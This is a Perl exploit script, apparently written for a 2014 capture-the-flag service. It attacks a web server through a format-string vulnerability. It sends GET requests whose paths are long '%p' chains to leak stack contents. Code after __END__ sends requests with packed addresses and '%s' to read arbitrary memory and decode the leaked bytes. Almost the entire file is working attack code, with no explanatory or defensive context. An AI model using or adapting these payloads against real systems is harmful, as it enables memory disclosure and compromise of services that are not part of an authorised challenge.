#!/usr/bin/perl

use strict;
use IO::Socket::SSL;
$|=1;
my $sock = IO::Socket::SSL->new("qiwictf2014.ru:8446") or die "Bad\n";
die "dead 1" unless $sock->connected();

#syswrite $sock, "GET " . "\x01\x80\x04\x08" . '%p%p//%3$x' . " HTTP/1.0\nConnection: Keep-Alive\n\n";
#sleep 1;

#syswrite $sock, "GET " . '%10$x' . " HTTP/1.0\r\n\r\n";

syswrite $sock, "GET " . '%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p' . " HTTP/1.0\nConnection: Keep-Alive\n\n";

die "dead 2" unless $sock->connected();
sysread $sock, my $data, 10240;
die "dead 3" unless $sock->connected();

#print $data;
sysread $sock, my $data, 102400;
die "dead 4" unless $sock->connected();

my $base = 0;
my @array = split /0x/, $data;
my @print_addr;
for (0..$#array) {
	print $array[$_],"\n";
#	if ($_ == 1178) {
#		$base = substr($array[$_], 0, 8);
#		print "$array[$_] => $base\n";
#	}

}

__END__
print "\n\nNXTNXTNXT\n\n";
#for (0..$#print_addr) {
#	my $hexval = hex($print_addr[$_]);
	my $hexval = hex($base);
#	$hexval = $hexval & 0xffff0fff

	my $test = 0;
for (0..200) {
	syswrite $sock, "GET " . pack("I*", $hexval) . '%x%x///%s' . " HTTP/1.0\nConnection: Keep-Alive\n\n";
	print "SEND QUERY:\n", "GET " . pack("I*", $hexval) . '%x%x///%s' . " HTTP/1.0\nConnection: Keep-Alive\n\n";
	sysread $sock, my $data, 1024;
#	print $data,"\n";
	sysread $sock, my $data, 1024;
#	print $data,"\n";
	$data =~ m/Page:(.+?)\/\/\/(.+?) not found/;
	print unpack("H*", $2), "\n";

	$hexval++;
	if (($hexval >> 24) == 0x0a or ($hexval >> 24) == 0x00) {
		$hexval++;
	}
}
#}
	syswrite $sock, "GET " . pack("I*", $hexval) . '%x%x///%s' . " HTTP/1.0\nConnection: Keep-Alive\n\n";
	print "SEND QUERY:\n", "GET " . pack("I*", $hexval) . '%x%x///%s' . " HTTP/1.0\nConnection: Keep-Alive\n\n";
	sysread $sock, my $data, 1024;
#	print $data,"\n";
	sysread $sock, my $data, 1024;
	print $data,"\n";
	$data =~ m/Page:(.+?)\/\/\/(.+?) not found/;
	print "0x$print_addr[$_] => " . unpack("H*", $2), "\n";

	syswrite $sock, "GET " . pack("I*", $hexval) . '%x%x///%s' . " HTTP/1.0\nConnection: Keep-Alive\n\n";
	print "SEND QUERY:\n", "GET " . pack("I*", $hexval) . '%x%x///%s' . " HTTP/1.0\nConnection: Keep-Alive\n\n";
	sysread $sock, my $data, 1024;
#	print $data,"\n";
	sysread $sock, my $data, 1024;
	print $data,"\n";
	$data =~ m/Page:(.+?)\/\/\/(.+?) not found/;
	print "0x$print_addr[$_] => " . unpack("H*", $2), "\n";

#$data =~ m/Page(.+?)\/\/\/(.+?)\snot\sfound\s:/;
